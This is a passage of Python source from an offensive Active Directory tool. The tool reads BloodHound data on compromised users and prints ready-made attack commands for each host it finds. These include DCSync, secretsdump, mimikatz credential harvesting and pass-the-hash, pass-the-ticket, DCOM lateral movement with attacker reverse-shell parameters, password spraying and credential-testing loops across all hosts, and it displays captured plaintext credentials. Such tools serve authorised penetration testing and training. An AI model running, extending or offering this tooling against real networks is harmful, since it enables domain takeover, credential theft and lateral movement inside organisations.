            if template and cred_value:
                cmd = fill_pwned_command(template, username, domain, infer_dc_hostname(domain), cred_value)
                reason = "Member of Domain Admins" if domain_access == "DomainAdmin" else "GetChanges+GetChangesAll"
                markdown_lines.append(f"| DCSync | {reason} | `{cmd}` |")
            markdown_lines.append("")

        # Local Admin access - per-target technique list
        admin_machines = access_by_priv.get("local-admin", [])
        if admin_machines:
            console_lines.append("")
            console_lines.append(f"🩸 {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(admin_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### Local Admin Access ({len(admin_machines)} machines)")
            markdown_lines.append("")

            priority_targets = []
            techniques = get_techniques_for_access("AdminTo")

            for ma in admin_machines[:10]:
                has_sessions = bool(ma.get("privileged_sessions"))
                inherited_from = ma.get("inherited_from")
                access_note = f" (via {inherited_from})" if inherited_from else ""

                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}{c.DIM}{access_note}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**{access_note}")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                # Show all available techniques for this target
                for tech in techniques:
                    template = tech.command_templates.get(cred_type)
                    if template and cred_value:
                        cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        tech_short = tech.name.split()[0].lower()
                        console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                        markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")  # Space between targets
                markdown_lines.append("")

                # Track priority targets for separate display
                if has_sessions:
                    priority_targets.append((ma, ma.get("privileged_sessions", [])))

            if len(admin_machines) > 10:
                console_lines.append(f"  {c.DIM}... and {len(admin_machines) - 10} more machines{c.RESET}")

            # Priority targets with sessions (secretsdump)
            if priority_targets:
                console_lines.append("")
                console_lines.append(f"  {c.YELLOW}⚠ PRIORITY TARGETS (privileged sessions detected){c.RESET}")
                console_lines.append("")

                markdown_lines.append(f"**Priority Targets (Active Sessions)**")
                markdown_lines.append("")

                for ma, sessions in priority_targets[:5]:
                    sessions_str = ", ".join(sessions[:2])
                    console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")
                    console_lines.append(f"    {c.YELLOW}Sessions: {sessions_str}{c.RESET}")

                    markdown_lines.append(f"**{ma['computer']}** - Sessions: {sessions_str}")
                    markdown_lines.append("")

                    sd_template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("secretsdump")
                    if sd_template and cred_value:
                        sd_cmd = fill_pwned_command(sd_template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        console_lines.append(f"    {c.DIM}secretsdump:{c.RESET}  {c.GREEN}{sd_cmd}{c.RESET}")
                        markdown_lines.append(f"```bash\n{sd_cmd}\n```")
                    console_lines.append("")
                    markdown_lines.append("")

            # Technique comparison legend
            console_lines.append(_generate_technique_legend_console(techniques, c))
            markdown_lines.append(_generate_technique_legend_markdown(techniques))

        # User-level access (RDP, WinRM) - per-target technique list
        user_machines = access_by_priv.get("user-level", [])
        if user_machines:
            console_lines.append("")
            console_lines.append(f"🔵 {c.BLUE}{c.BOLD}USER-LEVEL ACCESS{c.RESET} ({len(user_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### User-Level Access ({len(user_machines)} machines)")
            markdown_lines.append("")

            for ma in user_machines[:5]:
                access_types = ma.get("access_types", [])
                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                for access_type in access_types:
                    if access_type in ("CanRDP", "CanPSRemote"):
                        techniques = get_techniques_for_access(access_type)
                        for tech in techniques:
                            template = tech.command_templates.get(cred_type)
                            if template and cred_value:
                                cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                                tech_short = tech.name.split()[0].lower()
                                console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                                markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")
                markdown_lines.append("")

        # DCOM access - per-target technique list
        dcom_machines = access_by_priv.get("dcom-exec", [])
        if dcom_machines:
            console_lines.append("")
            console_lines.append(f"⚙️  {c.BLUE}{c.BOLD}DCOM ACCESS{c.RESET} ({len(dcom_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### DCOM Access ({len(dcom_machines)} machines)")
            markdown_lines.append("")

            techniques = get_techniques_for_access("ExecuteDCOM")

            for ma in dcom_machines[:3]:
                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                for tech in techniques:
                    template = tech.command_templates.get(cred_type)
                    if template and cred_value:
                        cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        tech_short = tech.name.split()[0].lower()
                        console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                        markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")
                markdown_lines.append("")

        # No edge-based access found
        if not admin_machines and not user_machines and not dcom_machines and not domain_access:
            console_lines.append(f"{c.DIM}No direct machine access via AdminTo/CanRDP/CanPSRemote edges.{c.RESET}")
            markdown_lines.append("_No direct machine access via BloodHound edges_")
            markdown_lines.append("")

        console_lines.append("")

    # Show authenticated user attacks ONCE at the end (template form)
    # These are generic - same for any domain user
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}AUTHENTICATED USER ATTACKS{c.RESET} (Any domain user can run these)")
    console_lines.append(f"{c.DIM}Replace placeholders with your credentials:{c.RESET}")
    console_lines.append("")

    from .command_mappings import AUTHENTICATED_USER_TEMPLATES, AUTHENTICATED_ATTACKS
    templates = AUTHENTICATED_USER_TEMPLATES.get("password", {})

    console_lines.append(f"  {'Attack':<25} {'Command Template'}")
    console_lines.append(f"  {'-'*25} {'-'*80}")

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if template:
            priority = " ⚡" if attack.get("priority") == "high" else ""
            name_display = f"{attack['name']}{priority}"
            console_lines.append(f"  {c.BOLD}{name_display:<25}{c.RESET} {c.GREEN}{template}{c.RESET}")

    console_lines.append("")

    # Markdown version
    markdown_lines.append(generate_authenticated_attacks_template_markdown())

    return "\n".join(console_lines), "\n".join(markdown_lines)


def _fetch_pwned_users(driver) -> list:
    """Fetch all pwned users with their credentials from Neo4j."""
    try:
        with driver.session() as session:
            result = session.run("""
                MATCH (u:User)
                WHERE u.pwned = true
                RETURN u.name AS name,
                       u.pwned_cred_types AS cred_types,
                       u.pwned_cred_values AS cred_values,
                       u.pwned_source_machine AS source_machine
                ORDER BY u.pwned_at DESC
            """)
            # Convert array format to single value for display (use first credential)
            users = []
            for record in result:
                cred_types = record["cred_types"] or []
                cred_values = record["cred_values"] or []
                users.append({
                    "name": record["name"],
                    "cred_type": cred_types[0] if cred_types else "password",
                    "cred_value": cred_values[0] if cred_values else "",
                    "source_machine": record["source_machine"]
                })
            return users
    except Exception:
        return []


def _fetch_user_access(driver, user_name: str) -> dict:
    """
    Fetch user's access paths grouped by privilege level.

    Includes both direct access AND inherited access through group membership
    (e.g., DOMAIN ADMINS members have AdminTo on all computers).

    Returns:
        Dict with keys: 'local-admin', 'user-level', 'dcom-exec'
        Each value is a list of dicts with 'computer', 'access_types', 'privileged_sessions', 'inherited_from'
    """
    try:
        with driver.session() as session:
            # Query for BOTH direct access AND inherited access through groups
            result = session.run("""
                // Direct access
                MATCH (u:User {name: $user_name})-[r:AdminTo|CanRDP|CanPSRemote|ExecuteDCOM]->(c:Computer)
                OPTIONAL MATCH (c)<-[:HasSession]-(priv:User)
                WHERE priv.admincount = true AND priv.name <> u.name
                WITH c, type(r) AS access_type, null AS inherited_from, collect(DISTINCT priv.name) AS priv_sessions
                RETURN c.name AS computer,
                       c.bloodtrail_ip AS computer_ip,
                       collect(DISTINCT access_type) AS access_types,
                       inherited_from,
                       priv_sessions AS privileged_sessions

                UNION

                // Inherited access through group membership
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[r:AdminTo|CanRDP|CanPSRemote|ExecuteDCOM]->(c:Computer)
                OPTIONAL MATCH (c)<-[:HasSession]-(priv:User)
                WHERE priv.admincount = true AND priv.name <> u.name
                WITH c, type(r) AS access_type, g.name AS inherited_from, collect(DISTINCT priv.name) AS priv_sessions
                RETURN c.name AS computer,
                       c.bloodtrail_ip AS computer_ip,
                       collect(DISTINCT access_type) AS access_types,
                       inherited_from,
                       priv_sessions AS privileged_sessions
            """, {"user_name": user_name})

            # Group by privilege level, deduplicating by computer
            access_by_priv = {
                "local-admin": [],
                "user-level": [],
                "dcom-exec": [],
            }
            seen_computers = {}  # Track to avoid duplicates

            for record in result:
                computer = record["computer"]
                computer_ip = record.get("computer_ip") or ""  # NEW: Get IP
                access_types = record["access_types"]
                inherited_from = record["inherited_from"]

                # Skip if we've seen this computer with same or better access
                if computer in seen_computers:
                    # Merge access types if same computer
                    existing = seen_computers[computer]
                    existing["access_types"] = list(set(existing["access_types"]) | set(access_types))
                    if inherited_from and not existing.get("inherited_from"):
                        existing["inherited_from"] = inherited_from
                    # Update IP if not already set
                    if computer_ip and not existing.get("computer_ip"):
                        existing["computer_ip"] = computer_ip
                    continue

                entry = {
                    "computer": computer,
                    "computer_ip": computer_ip,  # NEW: Store IP
                    "access_types": access_types,
                    "privileged_sessions": [s for s in record["privileged_sessions"] if s],
                    "inherited_from": inherited_from,
                }
                seen_computers[computer] = entry

                # Categorize by highest privilege
                if "AdminTo" in access_types:
                    access_by_priv["local-admin"].append(entry)
                elif "ExecuteDCOM" in access_types:
                    access_by_priv["dcom-exec"].append(entry)
                elif access_types:  # CanRDP, CanPSRemote
                    access_by_priv["user-level"].append(entry)

            return access_by_priv

    except Exception:
        return {"local-admin": [], "user-level": [], "dcom-exec": []}


def _check_domain_access(driver, user_name: str) -> str:
    """
    Check if user has domain-level privileges (direct or inherited through groups).

    Checks:
    1. Direct DCSync rights (GetChanges + GetChangesAll)
    2. Inherited DCSync through group membership (e.g., DOMAIN ADMINS)
    3. GenericAll on Domain
    4. Membership in high-privilege groups (Domain Admins, Enterprise Admins, Backup Operators)

    Returns:
        'DCSync' if user has GetChanges+GetChangesAll (direct or inherited)
        'DomainAdmin' if user is member of Domain Admins
        'GenericAll' if user has GenericAll on domain
        None otherwise
    """
    try:
        with driver.session() as session:
            # Check direct DCSync
            result = session.run("""
                MATCH (u:User {name: $user_name})-[r:GetChanges|GetChangesAll]->(d:Domain)
                WITH u, d, collect(DISTINCT type(r)) AS rights
                WHERE 'GetChanges' IN rights AND 'GetChangesAll' IN rights
                RETURN 'DCSync' AS access
            """, {"user_name": user_name})

            if result.single():
                return "DCSync"

            # Check inherited DCSync through group membership
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[r:GetChanges|GetChangesAll]->(d:Domain)
                WITH g, d, collect(DISTINCT type(r)) AS rights
                WHERE 'GetChanges' IN rights AND 'GetChangesAll' IN rights
                RETURN 'DCSync' AS access, g.name AS via_group
            """, {"user_name": user_name})

            record = result.single()
            if record:
                return "DCSync"

            # Check membership in Domain Admins / Enterprise Admins (implicit DCSync)
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)
                WHERE g.name STARTS WITH 'DOMAIN ADMINS@'
                   OR g.name STARTS WITH 'ENTERPRISE ADMINS@'
                   OR g.objectid ENDS WITH '-512'
                   OR g.objectid ENDS WITH '-519'
                RETURN g.name AS admin_group
                LIMIT 1
            """, {"user_name": user_name})

            record = result.single()
            if record:
                return "DomainAdmin"

            # Check direct GenericAll on Domain
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:GenericAll]->(d:Domain)
                RETURN 'GenericAll' AS access
            """, {"user_name": user_name})

            if result.single():
                return "GenericAll"

            # Check inherited GenericAll through group
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[:GenericAll]->(d:Domain)
                RETURN 'GenericAll' AS access
            """, {"user_name": user_name})

            if result.single():
                return "GenericAll"

            return None

    except Exception:
        return None


# =============================================================================
# POST-EXPLOITATION COMMANDS (for run_all_queries report)
# =============================================================================

def generate_post_exploit_section(driver, use_colors: bool = True, lhost: str = None, lport: int = None) -> tuple:
    """
    Generate Post-Exploitation Commands section for the report.

    Shows mimikatz credential harvest commands for all pwned users
    with local admin access.

    Args:
        driver: Neo4j driver instance
        use_colors: Enable ANSI colors for console output
        lhost: Attacker IP for reverse shells (auto-fetched from config if None)
        lport: Attacker port for reverse shells (auto-fetched from config if None)

    Returns:
        Tuple of (console_output: str, markdown_output: str)
        Returns ("", "") if no pwned users with admin access
    """
    from .command_mappings import (
        get_post_exploit_commands,
        get_harvest_tips,
    )

    c = Colors if use_colors else _NoColors

    # Fetch lhost/lport from domain config if not provided
    if lhost is None or lport is None:
        try:
            with driver.session() as session:
                result = session.run("""
                    MATCH (d:Domain)
                    RETURN d.bloodtrail_lhost AS lhost, d.bloodtrail_lport AS lport
                    LIMIT 1
                """)
                record = result.single()
                if record:
                    lhost = lhost or record.get("lhost")
                    lport = lport or record.get("lport")
        except Exception:
            pass

    # Fetch all pwned users with credentials
    pwned_users = _fetch_pwned_users(driver)
    if not pwned_users:
        return "", ""

    # Filter to users with local admin access
    users_with_admin = []
    for user in pwned_users:
        user_name = user["name"]
        access_by_priv = _fetch_user_access(driver, user_name)
        admin_machines = access_by_priv.get("local-admin", [])
        domain_access = _check_domain_access(driver, user_name)

        if admin_machines or domain_access:
            users_with_admin.append({
                "name": user_name,
                "cred_type": user.get("cred_type", "password"),
                "cred_value": user.get("cred_value", ""),
                "admin_machines": admin_machines,
                "domain_access": domain_access,
            })

    if not users_with_admin:
        return "", ""

    console_lines = []
    markdown_lines = []

    # Header
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}╔══════════════════════════════════════════════════════════════════════╗{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}║{c.RESET}   {c.RED}🔓{c.RESET} {c.BOLD}Post-Exploitation Commands{c.RESET}                                    {c.CYAN}{c.BOLD}║{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}╚══════════════════════════════════════════════════════════════════════╝{c.RESET}")
    console_lines.append("")

    markdown_lines.append("## 🔓 Post-Exploitation Commands")
    markdown_lines.append("")

    for user_data in users_with_admin:
        user_name = user_data["name"]
        cred_type = user_data["cred_type"]
        cred_value = user_data["cred_value"]
        admin_machines = user_data["admin_machines"]
        domain_access = user_data["domain_access"]

        # Extract username and domain from UPN
        if "@" in user_name:
            username, domain = user_name.split("@")
        else:
            username = user_name
            domain = ""

        # User header
        console_lines.append(f"{c.BOLD}{c.CYAN}{'═'*70}{c.RESET}")
        console_lines.append(f"{c.BOLD}{user_name}{c.RESET}")
        console_lines.append(f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET} = {c.GREEN}{cred_value}{c.RESET}" if cred_value else f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET}")
        console_lines.append(f"{c.CYAN}{'─'*70}{c.RESET}")
        console_lines.append("")

        markdown_lines.append(f"### {user_name}")
        markdown_lines.append(f"**Credential:** {cred_type}" + (f" = `{cred_value}`" if cred_value else ""))
        markdown_lines.append("")

        # Local Admin targets
        if admin_machines:
            target_list = ", ".join([m.get("computer", "?").split(".")[0] for m in admin_machines[:5]])
            if len(admin_machines) > 5:
                target_list += f" (+{len(admin_machines)-5} more)"
            console_lines.append(f"  {c.BOLD}Targets ({len(admin_machines)}):{c.RESET} {target_list}")
            console_lines.append("")

            markdown_lines.append(f"**Targets ({len(admin_machines)}):** {target_list}")
            markdown_lines.append("")

        # Credential Harvest Order
        console_lines.append(f"  {c.CYAN}{c.BOLD}CREDENTIAL HARVEST ORDER:{c.RESET}")
        console_lines.append("")

        markdown_lines.append("#### Credential Harvest Order")
        markdown_lines.append("")
        markdown_lines.append("| # | Command | Priority |")
        markdown_lines.append("|---|---------|----------|")

        harvest_commands = get_post_exploit_commands("local-admin", "credential_harvest")
        for idx, cmd_tuple in enumerate(harvest_commands, 1):
            module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_tuple[0]
            priority = cmd_tuple[3] if len(cmd_tuple) > 3 else "medium"
            mimi_cmd = f'mimikatz.exe "privilege::debug" "{module}" "exit"'

            priority_color = c.RED if priority == "high" else (c.YELLOW if priority == "medium" else c.DIM)
            console_lines.append(f"    {idx}. {c.GREEN}{mimi_cmd}{c.RESET}  {priority_color}[{priority.upper()}]{c.RESET}")

            markdown_lines.append(f"| {idx} | `{mimi_cmd}` | {priority.upper()} |")

        console_lines.append("")
        markdown_lines.append("")

        # Overpass-the-Hash tip
        console_lines.append(f"  {c.CYAN}WITH HARVESTED NTLM HASH:{c.RESET}")
        console_lines.append(f"    {c.GREEN}mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe\"{c.RESET}")
        console_lines.append(f"    {c.YELLOW}⚠ Use HOSTNAME not IP after Overpass-the-Hash!{c.RESET}")
        console_lines.append("")

        markdown_lines.append("#### With Harvested NTLM Hash")
        markdown_lines.append("")
        markdown_lines.append(f'```')
        markdown_lines.append(f'mimikatz.exe "sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe"')
        markdown_lines.append(f'```')
        markdown_lines.append(f'> ⚠️ **Important:** Use HOSTNAME not IP after Overpass-the-Hash!')
        markdown_lines.append("")

        # Pass-the-Ticket workflow
        target_hostnames = [m.get("computer", "TARGET") for m in admin_machines[:3]]
        ptt_console, ptt_markdown = _generate_ptt_workflow(target_hostnames, domain, c)
        console_lines.extend(ptt_console)
        markdown_lines.extend(ptt_markdown)

        # DCOM lateral movement workflow
        target_ips = [m.get("ip", m.get("computer", "TARGET")) for m in admin_machines[:3]]
        dcom_console, dcom_markdown = _generate_dcom_workflow(target_ips, c, lhost=lhost, lport=lport)
        console_lines.extend(dcom_console)
        markdown_lines.extend(dcom_markdown)

    return "\n".join(console_lines), "\n".join(markdown_lines)


# =============================================================================
# AUTHENTICATED USER ATTACKS (any domain user can run)
# =============================================================================

def _generate_authenticated_attacks(
    username: str,
    domain: str,
    cred_type: str,
    cred_value: str,
    dc_ip: str = None,
    use_colors: bool = True
) -> tuple:
    """
    Generate authenticated user attack commands.

    These attacks work for ANY authenticated domain user,
    regardless of BloodHound edges.

    Args:
        username: Username (without domain)
        domain: Domain name
        cred_type: password, ntlm-hash, kerberos-ticket
        cred_value: The credential value
        dc_ip: DC IP/hostname (optional, inferred from domain if not provided)
        use_colors: Enable ANSI colors

    Returns:
        Tuple of (console_lines: List[str], markdown_lines: List[str])
    """
    from .command_mappings import (
        AUTHENTICATED_USER_TEMPLATES,
        AUTHENTICATED_ATTACKS,
        fill_pwned_command,
        infer_dc_hostname,
    )

    c = Colors if use_colors else _NoColors

    # Get templates for this cred type
    templates = AUTHENTICATED_USER_TEMPLATES.get(cred_type, {})
    if not templates:
        return [], []

    dc = dc_ip or infer_dc_hostname(domain)

    console_lines = []
    markdown_lines = []

    # Section header
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}AUTHENTICATED USER ATTACKS{c.RESET} (Any domain user can run these)")
    console_lines.append("")

    # Table header (DRY format matching other command tables)
    console_lines.append(f"  {'Attack':<25} {'Objective':<45} {'Ready Command'}")
    console_lines.append(f"  {'-'*25} {'-'*45} {'-'*60}")

    markdown_lines.append("#### Authenticated User Attacks")
    markdown_lines.append("| Attack | Objective | Command |")
    markdown_lines.append("|--------|-----------|---------|")

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if not template:
            continue

        # Fill the command template
        cmd = fill_pwned_command(template, username, domain, dc, cred_value, dc)

        # Priority indicator
        priority = attack.get("priority", "medium")
        priority_indicator = " ⚡" if priority == "high" else ""

        # Truncate for table display
        name_display = _truncate(attack['name'] + priority_indicator, 23)
        objective_display = _truncate(attack['objective'], 43)

        # Console: tabular row
        console_lines.append(
            f"  {c.BOLD}{name_display:<25}{c.RESET} "
            f"{c.YELLOW}{objective_display:<45}{c.RESET} "
            f"{c.GREEN}{cmd}{c.RESET}"
        )

        # Markdown
        markdown_lines.append(f"| {attack['name']}{priority_indicator} | {attack['objective']} | `{cmd}` |")

    console_lines.append("")
    markdown_lines.append("")

    return console_lines, markdown_lines


def print_authenticated_attacks_template(use_colors: bool = True, dc_ip: str = None) -> None:
    """
    Print authenticated user attacks in template form (once, at end of output).

    Shows placeholders instead of filled credentials since these attacks
    are generic and work for ANY authenticated domain user.

    Args:
        use_colors: Enable ANSI colors
        dc_ip: Domain Controller IP (replaces <DC_IP> placeholder if provided)
    """
    from .command_mappings import AUTHENTICATED_USER_TEMPLATES, AUTHENTICATED_ATTACKS

    c = Colors if use_colors else _NoColors

    print(f"\n{c.CYAN}{c.BOLD}AUTHENTICATED USER ATTACKS{c.RESET} (Any domain user can run these)")
    print(f"{c.DIM}Replace placeholders with your credentials:{c.RESET}")
    print()

    # Show password templates (most common)
    templates = AUTHENTICATED_USER_TEMPLATES.get("password", {})

    print(f"  {'Attack':<25} {'Command Template'}")
    print(f"  {'-'*25} {'-'*80}")

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if template:
            # Replace DC_IP if stored
            if dc_ip:
                template = template.replace("<DC_IP>", dc_ip)
            priority = " ⚡" if attack.get("priority") == "high" else ""
            name_display = f"{attack['name']}{priority}"
            print(f"  {c.BOLD}{name_display:<25}{c.RESET} {c.GREEN}{template}{c.RESET}")

    print()


def generate_authenticated_attacks_template_markdown() -> str:
    """Generate markdown version of authenticated attacks template."""
    from .command_mappings import AUTHENTICATED_USER_TEMPLATES, AUTHENTICATED_ATTACKS

    lines = []
    lines.append("#### Authenticated User Attacks (Any Domain User)")
    lines.append("")
    lines.append("Replace placeholders with your credentials:")
    lines.append("")
    lines.append("| Attack | Command Template |")
    lines.append("|--------|------------------|")

    templates = AUTHENTICATED_USER_TEMPLATES.get("password", {})

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if template:
            priority = " ⚡" if attack.get("priority") == "high" else ""
            lines.append(f"| {attack['name']}{priority} | `{template}` |")

    lines.append("")
    return "\n".join(lines)


# =============================================================================
# PASSWORD SPRAY RECOMMENDATIONS
# =============================================================================

def print_spray_recommendations(
    pwned_users: List = None,
    policy = None,
    domain: str = "",
    dc_ip: str = "<DC_IP>",
    use_colors: bool = True,
    method_filter: str = "all",
    all_ips: List[str] = None,
) -> None:
    """
    Print password spray recommendations based on captured credentials and policy.

    Delegates to generate_spray_section() for core output, then handles
    method_filter and all_ips-specific features.

    Args:
        pwned_users: List of PwnedUser objects with credentials
        policy: Optional PasswordPolicy for safe spray planning
        domain: Domain name for command templates
        dc_ip: Domain Controller IP
        use_colors: Enable ANSI colors
        method_filter: Filter to specific method (smb, kerberos, ldap, all)
        all_ips: List of resolved IPs from Neo4j for multi-target loops
    """
    c = Colors if use_colors else _NoColors
    pwned_users = pwned_users or []
    passwords, usernames = extract_creds_from_pwned_users(pwned_users)

    # For "all" filter, use full generate_spray_section output
    if method_filter == "all":
        console_out, _ = generate_spray_section(
            pwned_users=pwned_users,
            policy=policy,
            domain=domain,
            dc_ip=dc_ip,
            use_colors=use_colors,
        )
        if console_out:
            # Print all except final separator (we'll add ALL TARGETS section)
            lines = console_out.rstrip().split('\n')
            # Find and remove the last "===" separator line if present
            if lines and '=' * 78 in lines[-1]:
                lines = lines[:-1]
            print('\n'.join(lines))

        # Add ALL TARGETS section (unique to print_spray_recommendations)
        if all_ips is not None:
            first_pwd = passwords[0] if passwords else "<PASSWORD>"
            first_user = usernames[0] if usernames else "<USERNAME>"
            _print_all_targets_section(
                all_ips=all_ips,
                password=first_pwd,
                username=first_user,
                domain=domain,
                c=c,
            )

        # Close with separator
        print()
        print(f"{c.CYAN}{'='*78}{c.RESET}")
        print()
        return

    # For filtered output (smb/kerberos/ldap only), show just that method
    from .command_mappings import SPRAY_TECHNIQUES, SPRAY_ONELINERS

    def fill_template(cmd: str, pwd: str = "<PASSWORD>") -> str:
        return fill_spray_template(cmd, dc_ip, domain, pwd, usernames)

    # Header
    print()
    print(f"{c.CYAN}{c.BOLD}{'='*78}{c.RESET}")
    print(f"  {c.BOLD}PASSWORD SPRAYING - {method_filter.upper()} METHOD{c.RESET}")
    print(f"{c.CYAN}{'='*78}{c.RESET}")

    # Show selected method
    method_map = {"smb": ("smb", "1"), "kerberos": ("kerberos", "2"), "ldap": ("ldap", "3")}
    if method_filter in method_map:
        tech_key, num = method_map[method_filter]
        tech = SPRAY_TECHNIQUES.get(tech_key)
        if tech:
            print()
            print(f"  {c.CYAN}{c.BOLD}METHOD {num}: {tech.name}{c.RESET}")
            print(f"  {c.DIM}Ports: {', '.join(str(p) for p in tech.ports)} | Noise: {tech.noise_level.upper()}{c.RESET}")
            print()

            template_key = "single_password" if tech_key != "ldap" else "spray_ps1"
            template = tech.command_templates.get(template_key, "")
            if template:
                if passwords and tech_key != "ldap":
                    for pwd in passwords[:3]:
                        cmd = fill_template(template, pwd)
                        print(f"    {c.GREEN}{cmd}{c.RESET}")
                else:
                    pwd = passwords[0] if passwords else "<PASSWORD>"
                    cmd = fill_template(template, pwd)
                    print(f"    {c.GREEN}{cmd}{c.RESET}")

            print()
            print(f"    {c.GREEN}+ {tech.advantages}{c.RESET}")
            print(f"    {c.RED}- {tech.disadvantages}{c.RESET}")

    # Show relevant one-liners
    print()
    print(f"  {c.YELLOW}{c.BOLD}SPRAY ONE-LINERS{c.RESET}")
    print(f"  {c.DIM}{'-'*70}{c.RESET}")
    first_pwd = passwords[0] if passwords else "<PASSWORD>"
    for i, oneliner in enumerate(SPRAY_ONELINERS, 1):
        cmd = fill_template(oneliner["cmd"], first_pwd)
        print(f"  {c.BOLD}{i}. {oneliner['name']}{c.RESET}")
        print(f"     {c.GREEN}{cmd}{c.RESET}")
        print()

    print(f"{c.CYAN}{'='*78}{c.RESET}")
    print()


def _print_all_targets_section(
    all_ips: List[str],
    password: str,
    username: str,
    domain: str,
    c,  # Colors class
) -> None:
    """
    Print credential validation loops for all discovered hosts.

    Shows bash loops for SMB, WinRM, RDP, and MSSQL protocols.
    Uses inline IPs for <=20 hosts, file-based input for >20.

    Args:
        all_ips: List of resolved IP addresses from Neo4j
        password: Password to test (from captured creds)
        username: Username to test (for single-user commands)
        domain: Domain name for authentication
        c: Colors class for output formatting
    """
    from .command_mappings import ALL_TARGETS_PROTOCOLS, ALL_TARGETS_IP_THRESHOLD

    if not all_ips:
        print()
        print(f"  {c.YELLOW}{c.BOLD}ALL TARGETS - Credential Validation{c.RESET}")
        print(f"  {c.DIM}{'-'*70}{c.RESET}")
        print(f"  {c.RED}No resolved IPs in BloodHound data.{c.RESET}")
        print(f"  {c.DIM}Run: crack bloodtrail --refresh-ips to resolve hostnames{c.RESET}")
        return

    ip_count = len(all_ips)
    use_file = ip_count > ALL_TARGETS_IP_THRESHOLD

    print()
    print(f"  {c.CYAN}{c.BOLD}ALL TARGETS - Credential Validation Loops{c.RESET}")
    print(f"  {c.DIM}Test where captured creds can authenticate across the network{c.RESET}")
    print(f"  {c.DIM}{ip_count} hosts with resolved IPs from BloodHound data{c.RESET}")
    print(f"  {c.DIM}{'-'*70}{c.RESET}")

    # Escape password for shell
    safe_password = password.replace("'", "'\"'\"'") if password else "<PASSWORD>"
    safe_username = username if username else "<USERNAME>"
    domain_lower = domain.lower() if domain else "<DOMAIN>"

    if use_file:
        # File-based format for many IPs
        print()
        print(f"  {c.YELLOW}# First, create targets file:{c.RESET}")
        # Show first few and last few IPs
        print(f"  {c.GREEN}cat << 'EOF' > targets.txt{c.RESET}")
        for ip in all_ips[:5]:
            print(f"  {c.GREEN}{ip}{c.RESET}")
        if ip_count > 10:
            print(f"  {c.DIM}... ({ip_count - 10} more IPs) ...{c.RESET}")
        for ip in all_ips[-5:]:
            print(f"  {c.GREEN}{ip}{c.RESET}")
        print(f"  {c.GREEN}EOF{c.RESET}")

        print()
        for proto, config in ALL_TARGETS_PROTOCOLS.items():
            port = config["port"]
            desc = config["description"]
            template = config["file_template"]

            cmd = template.format(
                targets_file="targets.txt",
                user_file="users.txt",
                username=safe_username,
                password=safe_password,
                domain=domain_lower,
            )

            print(f"  {c.BOLD}# {proto.upper()} (port {port}){c.RESET} {c.DIM}- {desc}{c.RESET}")
            print(f"  {c.GREEN}{cmd}{c.RESET}")
            print()
    else:
        # Inline IP format for fewer hosts
        ips_inline = " ".join(all_ips)

        for proto, config in ALL_TARGETS_PROTOCOLS.items():
            port = config["port"]
            desc = config["description"]
            template = config["loop_template"]

            cmd = template.format(
                ips=ips_inline,
                user_file="users.txt",
                username=safe_username,
                password=safe_password,
                domain=domain_lower,
            )

            print()
            print(f"  {c.BOLD}# {proto.upper()} (port {port}){c.RESET} {c.DIM}- {desc}{c.RESET}")
            print(f"  {c.GREEN}{cmd}{c.RESET}")


# =============================================================================
# PASSWORD SPRAY SECTION (for run_all_queries report integration)
# =============================================================================

def generate_spray_section(
    pwned_users: List = None,
    policy = None,
    domain: str = "",
    dc_ip: str = "<DC_IP>",
    use_colors: bool = True,
